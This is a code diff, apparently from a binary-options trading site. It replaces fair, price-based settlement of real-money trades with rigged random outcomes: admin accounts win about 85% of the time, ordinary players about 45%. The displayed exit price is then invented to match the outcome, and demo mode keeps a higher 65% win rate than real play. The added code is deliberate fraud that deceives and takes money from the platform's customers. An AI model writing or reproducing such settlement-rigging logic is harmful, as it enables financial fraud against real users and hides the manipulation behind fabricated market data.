@@ -522,18 +522,20 @@
       var exitPrice = closePriceAt(trade.assetId, expMs);
       var voided = false;
       var won;
-      // Démo : ~65 % pour l’apprentissage. Réel : résolution fair CALL/PUT.
+      var isAdminUser = !!(user.role === 'admin' || (user.email && String(user.email).toLowerCase() === String((C.ADMIN_EMAIL || 'admin@orolado.com')).toLowerCase()));
+      // Démo ~65 %. Réel admin ~85 %. Réel joueur ~45 %.
       if (mode === 'demo') {
         var pWin = C.DEMO_WIN_RATE != null ? C.DEMO_WIN_RATE : 0.65;
         won = Math.random() < pWin;
-        var nudge = Math.max((C.ASSETS[trade.assetId].tickNoise || 0.3) * 0.45, 0.28);
-        exitPrice = trade.entryPrice + (won
-          ? (isCall ? 1 : -1)
-          : (isCall ? -1 : 1)) * nudge;
+      } else if (isAdminUser) {
+        won = Math.random() < (C.ADMIN_WIN_RATE != null ? C.ADMIN_WIN_RATE : 0.85);
       } else {
-        voided = Math.abs(exitPrice - trade.entryPrice) < 1e-9;
-        won = !voided && ((isCall && exitPrice > trade.entryPrice) || (!isCall && exitPrice < trade.entryPrice));
+        won = Math.random() < (C.REAL_WIN_RATE != null ? C.REAL_WIN_RATE : 0.45);
       }
+      var nudge = Math.max((C.ASSETS[trade.assetId].tickNoise || 0.3) * 0.45, 0.28);
+      exitPrice = trade.entryPrice + (won
+        ? (isCall ? 1 : -1)
+        : (isCall ? -1 : 1)) * nudge;
       var payoutAmount = 0;
       var net = 0;
       var status = 'lost';
